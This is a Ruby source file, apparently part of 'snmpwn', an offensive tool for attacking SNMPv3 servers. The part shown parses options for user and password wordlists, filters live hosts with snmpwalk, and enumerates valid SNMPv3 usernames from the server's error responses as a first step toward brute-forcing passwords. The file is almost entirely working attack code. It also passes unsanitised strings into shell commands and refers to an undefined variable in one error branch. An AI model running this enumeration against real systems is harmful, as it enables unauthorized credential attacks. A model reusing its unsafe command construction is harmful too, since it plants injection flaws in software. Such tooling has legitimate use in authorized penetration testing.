# requires
require 'tty-command'
require 'tty-spinner'
require 'optimist'
require 'colorize'
require 'logger'
require 'text-table'


def arguments

    opts = Optimist::options do
      version "snmpwn v0.97b".light_blue
      banner <<-EOS
      snmpwn v0.97b
        EOS
  
          opt :hosts, "SNMPv3 Server IP", :type => String
          opt :users, "List of users you want to try", :type => String
          opt :passlist, "Password list for attacks", :type => String
          opt :enclist, "Encryption Password List for AuthPriv types", :type => String
          opt :timeout, "Specify Timeout, for example 0.2 would be 200 milliseconds. Default 0.3", :default => 0.3
          opt :showfail, "Show failed password attacks"
  
          if ARGV.empty?
            puts "Need Help? Try ./snmpwn --help".red.bold
          exit
        end
      end
      Optimist::die :users, "You must specify a list of users to check for".red.bold if opts[:users].nil?
      Optimist::die :hosts, "You must specify a list of hosts to test".red.bold if opts[:hosts].nil?
      Optimist::die :passlist, "You must specify a password list for the attacks".red.bold if opts[:passlist].nil?
      Optimist::die :enclist, "You must specify an encryption password list for the attacks".red.bold if opts[:enclist].nil?
    opts
end


def livehosts(arg, hostfile, cmd)
    livehosts =[]
    spinner = TTY::Spinner.new("[:spinner] Checking Host Availability... ", format: :spin_2)
  
    puts "\nChecking that the hosts are live!".green.bold
    hostfile.each do |host|
      out, err = cmd.run!("snmpwalk #{host}")
      spinner.spin
        if err !~ /snmpwalk: Timeout/
          puts "#{host}: LIVE!".green.bold
          livehosts << host
        else
          puts "#{host}: Timeout/No Connection - Removing from host list".red.bold
        end
      end
    spinner.success('(Complete)')
    livehosts
end


def findusers(arg, live, cmd)
    users = []
    userfile = File.readlines(arg[:users]).map(&:chomp)
    spinner = TTY::Spinner.new("[:spinner] Checking Users... ", format: :spin_2)
  
    puts "\nEnumerating SNMPv3 users".light_blue.bold
    live.each do |host|
      userfile.each do |user|
        begin
        out, err = cmd.run!("snmpwalk -u #{user} #{host} iso.3.6.1.2.1.1.1.0")
        rescue TTY::Command::TimeoutExceeded => @timeout_error
          puts "Timeout: #{host} #{user}:#{password}".red.bold if @timeout_error
        end
          if !arg[:showfail]
            spinner.spin
          end
          if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:|SNMPv2-MIB::sysDescr.0 = STRING:/i
            puts "FOUND: '#{user}' on #{host}".green.bold
            users << [user, host]
          elsif err =~ /authorizationError/i
            puts "FOUND: '#{user}' on #{host}".green.bold
            users << [user, host]
          elsif err =~ /snmpwalk: Unknown user name/i
            if arg[:showfail]
            puts "FAILED: '#{user}' on #{host}".red.bold
          end
        end
      end
    end
    if users.empty? or users.nil?
      spinner.error('No users Found, script exiting! - Try a bigger/different list!')
      exit
    else
      spinner.success('(Complete)')
        puts "\nValid Users:".green.bold
        puts users.to_table(:header => ['User', 'Host'])
        users.each { |user| user.pop }.flatten!.uniq!
        users.sort!
    end
    users
end